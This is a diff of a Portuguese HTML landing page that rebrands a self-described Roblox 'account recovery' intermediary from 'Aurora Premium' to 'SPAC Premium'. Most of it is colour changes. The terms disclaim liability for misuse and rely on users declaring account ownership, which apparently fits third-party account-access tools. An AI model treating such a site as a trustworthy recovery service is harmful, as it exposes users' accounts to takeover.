@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Aurora Premium | Dashboard Roxa</title>
+    <title>SPAC Premium | Dashboard</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=Poppins:wght@600;700;800;900&display=swap" rel="stylesheet">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
@@ -15,26 +15,26 @@
         }
 
         :root {
-            --primary: #7c3aed;
-            --primary-dark: #5b21b6;
-            --primary-light: #a78bfa;
-            --secondary: #c084fc;
-            --secondary-dark: #9333ea;
-            --accent: #ec4899;
+            /* CORES PRINCIPAIS */
+            --primary: #00d4ff;
+            --primary-dark: #0099cc;
+            --primary-light: #66e5ff;
+            --secondary: #ff6b6b;
+            --secondary-dark: #e74c3c;
+            --accent: #ffd93d;
             --success: #10b981;
             --warning: #f59e0b;
             --danger: #ef4444;
-            --dark: #0f0a1a;
-            --darker: #05020a;
+            --dark: #0a0e17;
+            --darker: #05080f;
             --light: #f8fafc;
             --border: #e2e8f0;
             --text: #1e293b;
             --text-light: #64748b;
             --nav-height: 70px;
-            --gold: #ffd700;
-            --aurora-purple: #7c3aed;
-            --aurora-light: #a78bfa;
-            --aurora-dark: #2d1b69;
+            --spac-blue: #00d4ff;
+            --spac-light: #66e5ff;
+            --spac-dark: #004466;
         }
 
         html {
@@ -43,14 +43,14 @@
 
         body {
             font-family: 'Inter', sans-serif;
-            background: linear-gradient(135deg, #0a0515 0%, #1a0d2e 50%, #0a0515 100%);
+            background: linear-gradient(135deg, #0a0e17 0%, #0d1b2a 50%, #0a0e17 100%);
             color: var(--text);
             line-height: 1.6;
             overflow-x: hidden;
             min-height: 100vh;
         }
 
-        /* ===== FUNDO ANIMADO AURORA ===== */
+        /* ===== FUNDO ANIMADO SPAC ===== */
         .animated-bg {
             position: fixed;
             inset: 0;
@@ -66,12 +66,12 @@
             top: -50%;
             left: -50%;
             background-image:
-                radial-gradient(2px 2px at 20% 30%, #c084fc, transparent),
-                radial-gradient(2px 2px at 40% 70%, #a78bfa, transparent),
-                radial-gradient(2px 2px at 60% 20%, #7c3aed, transparent),
-                radial-gradient(2px 2px at 80% 80%, #8b5cf6, transparent),
-                radial-gradient(1px 1px at 10% 50%, #a78bfa, transparent),
-                radial-gradient(1px 1px at 90% 40%, #7c3aed, transparent);
+                radial-gradient(2px 2px at 20% 30%, #00d4ff, transparent),
+                radial-gradient(2px 2px at 40% 70%, #66e5ff, transparent),
+                radial-gradient(2px 2px at 60% 20%, #0099cc, transparent),
+                radial-gradient(2px 2px at 80% 80%, #00d4ff, transparent),
+                radial-gradient(1px 1px at 10% 50%, #66e5ff, transparent),
+                radial-gradient(1px 1px at 90% 40%, #00d4ff, transparent);
             background-size: 200px 200px;
             animation: twinkle 4s ease-in-out infinite alternate;
         }
@@ -92,7 +92,7 @@
         .glow-1 {
             width: 500px;
             height: 500px;
-            background: var(--aurora-purple);
+            background: var(--spac-blue);
             top: -15%;
             left: -10%;
         }
@@ -100,7 +100,7 @@
         .glow-2 {
             width: 400px;
             height: 400px;
-            background: var(--aurora-light);
+            background: var(--secondary);
             bottom: -15%;
             right: -10%;
             animation-delay: -4s;
@@ -109,7 +109,7 @@
         .glow-3 {
             width: 300px;
             height: 300px;
-            background: var(--aurora-dark);
+            background: var(--spac-dark);
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
@@ -182,10 +182,10 @@
 
         /* ===== NAVBAR ===== */
         .navbar {
-            background: rgba(10, 5, 21, 0.95);
+            background: rgba(10, 14, 23, 0.95);
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
-            border-bottom: 2px solid rgba(124, 58, 237, 0.2);
+            border-bottom: 2px solid rgba(0, 212, 255, 0.2);
             position: sticky;
             top: 0;
             z-index: 1000;
@@ -214,7 +214,7 @@
             gap: 0.5rem;
             font-size: 1.3rem;
             font-weight: 900;
-            background: linear-gradient(135deg, #7c3aed, #a78bfa, #c084fc);
+            background: linear-gradient(135deg, #00d4ff, #66e5ff, #0099cc);
             background-size: 200% 200%;
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
@@ -225,7 +225,7 @@
 
         .nav-logo i {
             font-size: 1.5rem;
-            color: #c084fc;
+            color: #00d4ff;
             -webkit-text-fill-color: initial;
         }
 
@@ -259,7 +259,7 @@
             transform: translateX(-50%);
             width: 0;
             height: 2px;
-            background: linear-gradient(90deg, #7c3aed, #c084fc);
+            background: linear-gradient(90deg, #00d4ff, #66e5ff);
             transition: width 0.3s ease;
         }
 
@@ -273,13 +273,13 @@
         }
 
         .nav-link.active {
-            color: #c084fc;
-            background: rgba(124, 58, 237, 0.1);
+            color: #00d4ff;
+            background: rgba(0, 212, 255, 0.1);
         }
 
         .nav-link.active::before {
             width: 60%;
-            background: #c084fc;
+            background: #00d4ff;
         }
 
         .nav-link i {
@@ -337,9 +337,9 @@
             display: inline-flex;
             align-items: center;
             gap: 0.5rem;
-            background: rgba(124, 58, 237, 0.15);
-            border: 1px solid rgba(124, 58, 237, 0.4);
-            color: #c084fc;
+            background: rgba(0, 212, 255, 0.15);
+            border: 1px solid rgba(0, 212, 255, 0.4);
+            color: #00d4ff;
             padding: 0.5rem 1.2rem;
             border-radius: 50px;
             font-size: 0.8rem;
@@ -355,7 +355,7 @@
             font-weight: 900;
             line-height: 1.1;
             margin-bottom: 1rem;
-            background: linear-gradient(135deg, #c084fc 0%, #7c3aed 40%, #a78bfa 70%, #c084fc 100%);
+            background: linear-gradient(135deg, #00d4ff 0%, #66e5ff 40%, #0099cc 70%, #00d4ff 100%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
@@ -369,10 +369,10 @@
             animation: fadeInUp 0.8s ease-out 0.2s both;
         }
 
-        .hero-subtitle .aurora {
-            color: #c084fc;
+        .hero-subtitle .spac {
+            color: #00d4ff;
             font-weight: 900;
-            text-shadow: 0 0 20px rgba(124, 58, 237, 0.3);
+            text-shadow: 0 0 20px rgba(0, 212, 255, 0.3);
         }
 
         .hero-description {
@@ -401,21 +401,21 @@
             color: rgba(255, 255, 255, 0.8);
             font-weight: 600;
             font-size: 0.85rem;
-            background: rgba(124, 58, 237, 0.1);
+            background: rgba(0, 212, 255, 0.1);
             padding: 0.5rem 1.2rem;
             border-radius: 8px;
-            border: 1px solid rgba(124, 58, 237, 0.2);
+            border: 1px solid rgba(0, 212, 255, 0.2);
             transition: all 0.3s ease;
         }
 
         .feature-badge:hover {
-            background: rgba(124, 58, 237, 0.2);
-            border-color: rgba(124, 58, 237, 0.4);
+            background: rgba(0, 212, 255, 0.2);
+            border-color: rgba(0, 212, 255, 0.4);
             transform: translateY(-3px);
         }
 
         .feature-badge i {
-            color: #c084fc;
+            color: #00d4ff;
             font-size: 1rem;
         }
 
@@ -454,15 +454,15 @@
         }
 
         .btn-primary {
-            background: linear-gradient(135deg, #7c3aed, #5b21b6);
+            background: linear-gradient(135deg, #00d4ff, #0099cc);
             color: white;
-            box-shadow: 0 10px 30px rgba(124, 58, 237, 0.3);
-            border: 1px solid rgba(192, 132, 252, 0.3);
+            box-shadow: 0 10px 30px rgba(0, 212, 255, 0.3);
+            border: 1px solid rgba(102, 229, 255, 0.3);
         }
 
         .btn-primary:hover {
             transform: translateY(-3px);
-            box-shadow: 0 15px 40px rgba(124, 58, 237, 0.5);
+            box-shadow: 0 15px 40px rgba(0, 212, 255, 0.5);
         }
 
         .btn-primary:active {
@@ -489,7 +489,7 @@
             font-weight: 900;
             text-align: center;
             margin-bottom: 0.8rem;
-            background: linear-gradient(135deg, #c084fc 0%, #7c3aed 40%, #a78bfa 70%, #c084fc 100%);
+            background: linear-gradient(135deg, #00d4ff 0%, #66e5ff 40%, #0099cc 70%, #00d4ff 100%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
@@ -515,7 +515,7 @@
             background: linear-gradient(135deg, rgba(255, 255, 255, 0.08), rgba(255, 255, 255, 0.02));
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(124, 58, 237, 0.15);
+            border: 1px solid rgba(0, 212, 255, 0.15);
             border-radius: 16px;
             padding: 2rem;
             transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
@@ -532,7 +532,7 @@
             right: -50%;
             width: 200%;
             height: 200%;
-            background: radial-gradient(circle, rgba(124, 58, 237, 0.1) 0%, transparent 70%);
+            background: radial-gradient(circle, rgba(0, 212, 255, 0.1) 0%, transparent 70%);
             opacity: 0;
             transition: opacity 0.4s ease;
         }
@@ -548,15 +548,15 @@
 
         .card:hover {
             background: linear-gradient(135deg, rgba(255, 255, 255, 0.12), rgba(255, 255, 255, 0.05));
-            border-color: rgba(124, 58, 237, 0.4);
+            border-color: rgba(0, 212, 255, 0.4);
             transform: translateY(-8px);
-            box-shadow: 0 20px 40px rgba(124, 58, 237, 0.25);
+            box-shadow: 0 20px 40px rgba(0, 212, 255, 0.25);
         }
 
         .card-icon {
             width: 60px;
             height: 60px;
-            background: linear-gradient(135deg, #7c3aed, #5b21b6);
+            background: linear-gradient(135deg, #00d4ff, #0099cc);
             border-radius: 14px;
             display: flex;
             align-items: center;
@@ -564,7 +564,7 @@
             font-size: 1.7rem;
             color: white;
             margin-bottom: 1.2rem;
-            box-shadow: 0 10px 30px rgba(124, 58, 237, 0.3);
+            box-shadow: 0 10px 30px rgba(0, 212, 255, 0.3);
             transition: all 0.3s ease;
         }
 
@@ -598,7 +598,7 @@
             background: linear-gradient(135deg, rgba(255, 255, 255, 0.08), rgba(255, 255, 255, 0.02));
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(124, 58, 237, 0.15);
+            border: 1px solid rgba(0, 212, 255, 0.15);
             border-radius: 20px;
             padding: 2rem;
             animation: slideInLeft 0.8s ease-out;
@@ -613,7 +613,7 @@
             align-items: center;
             margin-bottom: 2rem;
             padding-bottom: 1.5rem;
-            border-bottom: 1px solid rgba(124, 58, 237, 0.1);
+            border-bottom: 1px solid rgba(0, 212, 255, 0.1);
             flex-wrap: wrap;
             gap: 0.8rem;
         }
@@ -626,13 +626,13 @@
         }
 
         .badge {
-            background: linear-gradient(135deg, #7c3aed, #c084fc);
-            color: white;
+            background: linear-gradient(135deg, #00d4ff, #66e5ff);
+            color: #0a0e17;
             padding: 0.4rem 1.2rem;
             border-radius: 50px;
             font-size: 0.75rem;
             font-weight: 900;
-            box-shadow: 0 10px 25px rgba(124, 58, 237, 0.3);
+            box-shadow: 0 10px 25px rgba(0, 212, 255, 0.3);
             animation: bounceIn 0.6s ease-out;
             white-space: nowrap;
         }
@@ -652,7 +652,7 @@
         }
 
         .form-label i {
-            color: #c084fc;
+            color: #00d4ff;
             font-size: 1rem;
         }
 
@@ -666,7 +666,7 @@
             width: 100%;
             padding: 0.9rem 1rem;
             background: rgba(255, 255, 255, 0.05);
-            border: 1.5px solid rgba(124, 58, 237, 0.2);
+            border: 1.5px solid rgba(0, 212, 255, 0.2);
             border-radius: 12px;
             color: white;
             font-size: 0.95rem;
@@ -680,8 +680,8 @@
         .form-input:focus {
             outline: none;
             background: rgba(255, 255, 255, 0.08);
-            border-color: rgba(124, 58, 237, 0.6);
-            box-shadow: 0 0 0 4px rgba(124, 58, 237, 0.15);
+            border-color: rgba(0, 212, 255, 0.6);
+            box-shadow: 0 0 0 4px rgba(0, 212, 255, 0.15);
         }
 
         .form-input::placeholder {
@@ -701,7 +701,7 @@
         }
 
         .toggle-btn:hover {
-            color: #c084fc;
+            color: #00d4ff;
         }
 
         .form-hint {
@@ -713,8 +713,8 @@
         }
 
         .security-box {
-            background: linear-gradient(135deg, rgba(124, 58, 237, 0.15), rgba(124, 58, 237, 0.05));
-            border: 1.5px solid rgba(124, 58, 237, 0.3);
+            background: linear-gradient(135deg, rgba(0, 212, 255, 0.15), rgba(0, 212, 255, 0.05));
+            border: 1.5px solid rgba(0, 212, 255, 0.3);
             border-radius: 12px;
             padding: 1.2rem;
             display: flex;
@@ -724,7 +724,7 @@
         }
 
         .security-box i {
-            color: #a78bfa;
+            color: #66e5ff;
             font-size: 1.3rem;
             flex-shrink: 0;
             margin-top: 0.2rem;
@@ -737,7 +737,7 @@
         }
 
         .security-box strong {
-            color: #c084fc;
+            color: #00d4ff;
         }
 
         .btn-block {
@@ -753,14 +753,14 @@
         }
 
         .disclaimer a {
-            color: #c084fc;
+            color: #00d4ff;
             text-decoration: none;
             font-weight: 700;
             transition: color 0.3s ease;
         }
 
         .disclaimer a:hover {
-            color: #a78bfa;
+            color: #66e5ff;
         }
 
         /* ===== BLOQUEIO MESSAGE ===== */
@@ -800,7 +800,7 @@
         .block-message .timer {
             font-size: 2rem;
             font-weight: 900;
-            color: #c084fc;
+            color: #00d4ff;
             margin: 0.5rem 0;
         }
 
@@ -815,7 +815,7 @@
             background: linear-gradient(135deg, rgba(255, 255, 255, 0.08), rgba(255, 255, 255, 0.02));
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(124, 58, 237, 0.15);
+            border: 1px solid rgba(0, 212, 255, 0.15);
             border-radius: 16px;
             padding: 1.5rem;
             animation: slideInRight 0.8s ease-out;
@@ -833,7 +833,7 @@
         }
 
         .info-card h4 i {
-            color: #c084fc;
+            color: #00d4ff;
         }
 
         .info-item {
@@ -841,7 +841,7 @@
             justify-content: space-between;
             align-items: center;
             padding: 0.6rem 0;
-            border-bottom: 1px solid rgba(124, 58, 237, 0.05);
+            border-bottom: 1px solid rgba(0, 212, 255, 0.05);
             transition: all 0.3s ease;
         }
 
@@ -860,7 +860,7 @@
         }
 
         .info-value {
-            color: #c084fc;
+            color: #00d4ff;
             font-weight: 800;
             font-size: 1rem;
         }
@@ -886,7 +886,7 @@
         }
 
         .features-list i {
-            color: #a78bfa;
+            color: #66e5ff;
             font-weight: 700;
         }
 
@@ -896,8 +896,8 @@
             gap: 0.4rem;
             font-size: 0.75rem;
             font-weight: 700;
-            color: #a78bfa;
-            background: rgba(124, 58, 237, 0.1);
+            color: #66e5ff;
+            background: rgba(0, 212, 255, 0.1);
             padding: 0.3rem 0.8rem;
             border-radius: 50px;
             width: fit-content;
@@ -919,7 +919,7 @@
             background: linear-gradient(135deg, rgba(255, 255, 255, 0.08), rgba(255, 255, 255, 0.02));
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(124, 58, 237, 0.15);
+            border: 1px solid rgba(0, 212, 255, 0.15);
             border-radius: 14px;
             overflow: hidden;
             transition: all 0.4s ease;
@@ -936,7 +936,7 @@
 
         .faq-item:hover {
             background: linear-gradient(135deg, rgba(255, 255, 255, 0.12), rgba(255, 255, 255, 0.05));
-            border-color: rgba(124, 58, 237, 0.3);
+            border-color: rgba(0, 212, 255, 0.3);
             transform: translateY(-5px);
         }
 
@@ -952,7 +952,7 @@
         }
 
         .faq-question:hover {
-            background: rgba(124, 58, 237, 0.05);
+            background: rgba(0, 212, 255, 0.05);
         }
 
         .faq-question h3 {
@@ -963,7 +963,7 @@
         }
 
         .faq-question i {
-            color: #c084fc;
+            color: #00d4ff;
             transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
             font-size: 1rem;
             flex-shrink: 0;
@@ -972,7 +972,7 @@
 
         .faq-item.active .faq-question i {
             transform: rotate(180deg);
-            color: #7c3aed;
+            color: #0099cc;
         }
 
         .faq-answer {
@@ -1004,7 +1004,7 @@
             background: linear-gradient(135deg, rgba(255, 255, 255, 0.08), rgba(255, 255, 255, 0.02));
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(124, 58, 237, 0.15);
+            border: 1px solid rgba(0, 212, 255, 0.15);
             border-radius: 16px;
             padding: 2rem;
             text-align: center;
@@ -1022,7 +1022,7 @@
             right: -50%;
             width: 200%;
             height: 200%;
-            background: radial-gradient(circle, rgba(124, 58, 237, 0.1) 0%, transparent 70%);
+            background: radial-gradient(circle, rgba(0, 212, 255, 0.1) 0%, transparent 70%);
             opacity: 0;
             transition: opacity 0.4s ease;
         }
@@ -1037,16 +1037,16 @@
 
         .stat-box:hover {
             background: linear-gradient(135deg, rgba(255, 255, 255, 0.12), rgba(255, 255, 255, 0.05));
-            border-color: rgba(124, 58, 237, 0.4);
+            border-color: rgba(0, 212, 255, 0.4);
             transform: translateY(-8px);
-            box-shadow: 0 20px 40px rgba(124, 58, 237, 0.25);
+            box-shadow: 0 20px 40px rgba(0, 212, 255, 0.25);
         }
 
         .stat-number {
             display: block;
             font-size: clamp(1.8rem, 4vw, 2.8rem);
             font-weight: 900;
-            background: linear-gradient(135deg, #c084fc, #7c3aed);
+            background: linear-gradient(135deg, #00d4ff, #66e5ff);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
@@ -1072,7 +1072,7 @@
             background: linear-gradient(135deg, rgba(255, 255, 255, 0.08), rgba(255, 255, 255, 0.02));
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(124, 58, 237, 0.15);
+            border: 1px solid rgba(0, 212, 255, 0.15);
             border-radius: 16px;
             padding: 2rem;
             text-align: center;
@@ -1088,9 +1088,9 @@
 
         .comunidade-card:hover {
             background: linear-gradient(135deg, rgba(255, 255, 255, 0.12), rgba(255, 255, 255, 0.05));
-            border-color: rgba(124, 58, 237, 0.4);
+            border-color: rgba(0, 212, 255, 0.4);
             transform: translateY(-8px);
-            box-shadow: 0 20px 40px rgba(124, 58, 237, 0.25);
+            box-shadow: 0 20px 40px rgba(0, 212, 255, 0.25);
         }
 
         .comunidade-icon {
@@ -1110,7 +1110,7 @@
         }
 
         .comunidade-icon.discord { background: linear-gradient(135deg, #5865F2, #4752C4); color: white; }
-        .comunidade-icon.email { background: linear-gradient(135deg, #7c3aed, #5b21b6); color: white; }
+        .comunidade-icon.email { background: linear-gradient(135deg, #00d4ff, #0099cc); color: white; }
         .comunidade-icon.tiktok { background: linear-gradient(135deg, #000000, #1a1a1a); color: #25f4ee; border: 2px solid #25f4ee; }
 
         .comunidade-card h3 {
@@ -1130,7 +1130,7 @@
         .comunidade-card .btn-comunidade {
             background: rgba(255, 255, 255, 0.05);
             color: rgba(255, 255, 255, 0.8);
-            border: 1.5px solid rgba(124, 58, 237, 0.1);
+            border: 1.5px solid rgba(0, 212, 255, 0.1);
             border-radius: 10px;
             padding: 0.7rem 1.5rem;
             font-weight: 700;
@@ -1147,17 +1147,17 @@
         }
 
         .comunidade-card:hover .btn-comunidade {
-            background: rgba(124, 58, 237, 0.15);
-            border-color: rgba(124, 58, 237, 0.4);
-            color: #c084fc;
+            background: rgba(0, 212, 255, 0.15);
+            border-color: rgba(0, 212, 255, 0.4);
+            color: #00d4ff;
         }
 
         .email-info {
             margin-top: 1rem;
             padding: 0.8rem;
-            background: rgba(124, 58, 237, 0.1);
+            background: rgba(0, 212, 255, 0.1);
             border-radius: 10px;
-            border: 1px solid rgba(124, 58, 237, 0.2);
+            border: 1px solid rgba(0, 212, 255, 0.2);
         }
 
         .email-info p {
@@ -1170,7 +1170,7 @@
         }
 
         .email-info i {
-            color: #c084fc;
+            color: #00d4ff;
         }
 
         /* ===== TERMS & PRIVACY MODAL ===== */
@@ -1193,10 +1193,10 @@
         }
 
         .terms-modal-content {
-            background: linear-gradient(135deg, rgba(10, 5, 21, 0.98), rgba(26, 13, 46, 0.98));
+            background: linear-gradient(135deg, rgba(10, 14, 23, 0.98), rgba(13, 27, 42, 0.98));
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(124, 58, 237, 0.15);
+            border: 1px solid rgba(0, 212, 255, 0.15);
             border-radius: 20px;
             padding: 2.5rem;
             max-width: 700px;
@@ -1216,7 +1216,7 @@
         }
 
         .terms-modal-content h3 {
-            color: #c084fc;
+            color: #00d4ff;
             font-size: 1.1rem;
             font-weight: 700;
             margin: 1.5rem 0 0.8rem;
@@ -1265,13 +1265,13 @@
         }
 
         .terms-modal-content .terms-actions .btn-primary-modal {
-            background: linear-gradient(135deg, #7c3aed, #5b21b6);
+            background: linear-gradient(135deg, #00d4ff, #0099cc);
             color: white;
         }
 
         .terms-modal-content .terms-actions .btn-primary-modal:hover {
             transform: translateY(-2px);
-            box-shadow: 0 10px 30px rgba(124, 58, 237, 0.4);
+            box-shadow: 0 10px 30px rgba(0, 212, 255, 0.4);
         }
 
         .terms-close-btn {
@@ -1301,7 +1301,7 @@
             background: linear-gradient(135deg, rgba(255, 255, 255, 0.08), rgba(255, 255, 255, 0.02));
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(124, 58, 237, 0.15);
+            border: 1px solid rgba(0, 212, 255, 0.15);
             border-radius: 16px;
             padding: 1.8rem;
             text-align: center;
@@ -1339,7 +1339,7 @@
             justify-content: center;
             font-size: 1.2rem;
             font-weight: 900;
-            color: #c084fc;
+            color: #00d4ff;
             z-index: 10;
             border-radius: 16px;
         }
@@ -1351,22 +1351,22 @@
 
         .donation-card:hover:not(.desativado) {
             background: linear-gradient(135deg, rgba(255, 255, 255, 0.12), rgba(255, 255, 255, 0.05));
-            border-color: rgba(124, 58, 237, 0.3);
+            border-color: rgba(0, 212, 255, 0.3);
             transform: translateY(-8px);
         }
 
         .donation-icon {
             width: 70px;
             height: 70px;
-            background: linear-gradient(135deg, #7c3aed, #c084fc);
+            background: linear-gradient(135deg, #00d4ff, #66e5ff);
             border-radius: 16px;
             display: flex;
             align-items: center;
             justify-content: center;
             font-size: 2rem;
-            color: white;
+            color: #0a0e17;
             margin: 0 auto 1.2rem;
-            box-shadow: 0 10px 30px rgba(124, 58, 237, 0.3);
+            box-shadow: 0 10px 30px rgba(0, 212, 255, 0.3);
             transition: all 0.3s ease;
         }
 
@@ -1388,19 +1388,19 @@
         }
 
         .btn-secondary {
-            background: rgba(124, 58, 237, 0.15);
-            color: #c084fc;
-            border: 1.5px solid rgba(124, 58, 237, 0.4);
+            background: rgba(0, 212, 255, 0.15);
+            color: #00d4ff;
+            border: 1.5px solid rgba(0, 212, 255, 0.4);
             backdrop-filter: blur(10px);
             -webkit-backdrop-filter: blur(10px);
             width: 100%;
         }
 
         .btn-secondary:hover:not(:disabled) {
-            background: rgba(124, 58, 237, 0.25);
-            border-color: rgba(124, 58, 237, 0.6);
+            background: rgba(0, 212, 255, 0.25);
+            border-color: rgba(0, 212, 255, 0.6);
             transform: translateY(-3px);
-            color: #a78bfa;
+            color: #66e5ff;
         }
 
         .btn-secondary:disabled {
@@ -1410,8 +1410,8 @@
 
         /* ===== FOOTER ===== */
         .footer {
-            background: rgba(10, 5, 21, 0.95);
-            border-top: 2px solid rgba(124, 58, 237, 0.1);
+            background: rgba(10, 14, 23, 0.95);
+            border-top: 2px solid rgba(0, 212, 255, 0.1);
             padding: 3rem 0 1.5rem;
             margin-top: 4rem;
             position: relative;
@@ -1447,7 +1447,7 @@
         }
 
         .footer-section a:hover {
-            color: #c084fc;
+            color: #00d4ff;
             padding-left: 0.3rem;
         }
 
@@ -1458,18 +1458,18 @@
         .footer-bottom {
             text-align: center;
             padding-top: 1.5rem;
-            border-top: 1px solid rgba(124, 58, 237, 0.1);
+            border-top: 1px solid rgba(0, 212, 255, 0.1);
             color: rgba(255, 255, 255, 0.5);
             font-size: 0.8rem;
         }
 
         .footer-bottom i {
-            color: #7c3aed;
+            color: #00d4ff;
             animation: pulse 1.5s ease-in-out infinite;
         }
 
-        .footer-bottom .aurora {
-            color: #c084fc;
+        .footer-bottom .spac {
+            color: #00d4ff;
         }
 
         /* ===== MODAL ===== */
@@ -1494,10 +1494,10 @@
 
         .processing-modal,
         .success-modal {
-            background: linear-gradient(135deg, rgba(10, 5, 21, 0.95), rgba(26, 13, 46, 0.95));
+            background: linear-gradient(135deg, rgba(10, 14, 23, 0.95), rgba(13, 27, 42, 0.95));
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(124, 58, 237, 0.15);
+            border: 1px solid rgba(0, 212, 255, 0.15);
             border-radius: 20px;
             padding: 2.5rem;
             max-width: 450px;
@@ -1509,8 +1509,8 @@
         .loader {
             width: 70px;
             height: 70px;
-            border: 4px solid rgba(124, 58, 237, 0.2);
-            border-top: 4px solid #c084fc;
+            border: 4px solid rgba(0, 212, 255, 0.2);
+            border-top: 4px solid #00d4ff;
             border-radius: 50%;
             margin: 0 auto 1.5rem;
             animation: spin 1s linear infinite;
@@ -1545,7 +1545,7 @@
 
         .progress-fill {
             height: 100%;
-            background: linear-gradient(90deg, #7c3aed, #c084fc);
+            background: linear-gradient(90deg, #00d4ff, #66e5ff);
             border-radius: 10px;
             animation: progressFill 3s ease-out forwards;
         }
@@ -1559,15 +1559,15 @@
         .success-icon {
             width: 80px;
             height: 80px;
-            background: linear-gradient(135deg, rgba(124, 58, 237, 0.2), rgba(124, 58, 237, 0.05));
-            border: 2px solid rgba(124, 58, 237, 0.4);
+            background: linear-gradient(135deg, rgba(0, 212, 255, 0.2), rgba(0, 212, 255, 0.05));
+            border: 2px solid rgba(0, 212, 255, 0.4);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
             margin: 0 auto 1.5rem;
             font-size: 2.5rem;
-            color: #a78bfa;
+            color: #66e5ff;
             animation: bounceIn 0.6s ease-out;
         }
 
@@ -1587,15 +1587,15 @@
         }
 
         .btn-success {
-            background: linear-gradient(135deg, #7c3aed, #5b21b6);
+            background: linear-gradient(135deg, #00d4ff, #0099cc);
             color: white;
-            box-shadow: 0 10px 30px rgba(124, 58, 237, 0.3);
+            box-shadow: 0 10px 30px rgba(0, 212, 255, 0.3);
             width: 100%;
         }
 
         .btn-success:hover {
             transform: translateY(-3px);
-            box-shadow: 0 15px 40px rgba(124, 58, 237, 0.5);
+            box-shadow: 0 15px 40px rgba(0, 212, 255, 0.5);
         }
 
         /* ===== BLOQUEIO DE ACESSO ===== */
@@ -1618,7 +1618,7 @@
         }
 
         .block-modal-content {
-            background: linear-gradient(135deg, rgba(10, 5, 21, 0.98), rgba(26, 13, 46, 0.98));
+            background: linear-gradient(135deg, rgba(10, 14, 23, 0.98), rgba(13, 27, 42, 0.98));
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
             border: 2px solid rgba(239, 68, 68, 0.4);
@@ -1699,12 +1699,12 @@
                 top: 100%;
                 left: 0;
                 right: 0;
-                background: rgba(10, 5, 21, 0.98);
+                background: rgba(10, 14, 23, 0.98);
                 backdrop-filter: blur(20px);
                 -webkit-backdrop-filter: blur(20px);
                 padding: 1rem 1.5rem;
                 gap: 0.3rem;
-                border-bottom: 2px solid rgba(124, 58, 237, 0.1);
+                border-bottom: 2px solid rgba(0, 212, 255, 0.1);
                 box-shadow: 0 20px 40px rgba(0,0,0,0.3);
             }
 
@@ -1783,7 +1783,7 @@
     </style>
 </head>
 <body>
-    <!-- ===== FUNDO ANIMADO AURORA ===== -->
+    <!-- ===== FUNDO ANIMADO SPAC ===== -->
     <div class="animated-bg">
         <div class="stars"></div>
         <div class="glow-orb glow-1"></div>
@@ -1797,16 +1797,16 @@
             <button class="terms-close-btn" onclick="closeTermsModal()">
                 <i class="fas fa-times"></i>
             </button>
-            <h2>✨ Termos de Serviço & Política de Privacidade</h2>
+            <h2>🌊 Termos de Serviço & Política de Privacidade</h2>
             
             <h3>1. Termos de Serviço</h3>
-            <p>Ao utilizar a plataforma Aurora Premium, você concorda com os seguintes termos:</p>
+            <p>Ao utilizar a plataforma SPAC Premium, você concorda com os seguintes termos:</p>
             <ul>
-                <li><strong>1.1</strong> A Aurora Premium é uma ferramenta de recuperação de contas que atua como intermediária entre o usuário e a plataforma Roblox.</li>
+                <li><strong>1.1</strong> A SPAC Premium é uma ferramenta de recuperação de contas que atua como intermediária entre o usuário e a plataforma Roblox.</li>
                 <li><strong>1.2</strong> Não nos responsabilizamos pelo mau uso da ferramenta. O usuário é o único responsável por suas ações.</li>
                 <li><strong>1.3</strong> A recuperação de contas é um processo que depende de fatores externos e pode não ser 100% garantido.</li>
                 <li><strong>1.4</strong> O usuário declara ser o legítimo proprietário da conta que está tentando recuperar.</li>
-                <li><strong>1.5</strong> A Aurora Premium não se responsabiliza por qualquer dano, perda ou prejuízo causado pelo uso da ferramenta.</li>
+                <li><strong>1.5</strong> A SPAC Premium não se responsabiliza por qualquer dano, perda ou prejuízo causado pelo uso da ferramenta.</li>
             </ul>
 
             <h3>2. Política de Privacidade</h3>
@@ -1821,7 +1821,7 @@
             </ul>
 
             <h3>3. Isenção de Responsabilidade</h3>
-            <p>A Aurora Premium é uma ferramenta independente e não é afiliada, endossada ou patrocinada pela Roblox Corporation. A recuperação de contas está sujeita às políticas e termos de serviço da Roblox. Não garantimos a recuperação bem-sucedida de todas as contas, pois cada caso é único e depende de diversos fatores.</p>
+            <p>A SPAC Premium é uma ferramenta independente e não é afiliada, endossada ou patrocinada pela Roblox Corporation. A recuperação de contas está sujeita às políticas e termos de serviço da Roblox. Não garantimos a recuperação bem-sucedida de todas as contas, pois cada caso é único e depende de diversos fatores.</p>
 
             <h3>4. Aceitação dos Termos</h3>
             <p>Ao clicar em "Aceito e Concordo", você declara que leu, entendeu e concorda com todos os termos e condições descritos acima. Caso não concorde com algum dos termos, recomendamos que não utilize a plataforma.</p>
@@ -1855,8 +1855,8 @@
     <nav class="navbar">
         <div class="nav-container">
             <div class="nav-logo" onclick="showSection('home')">
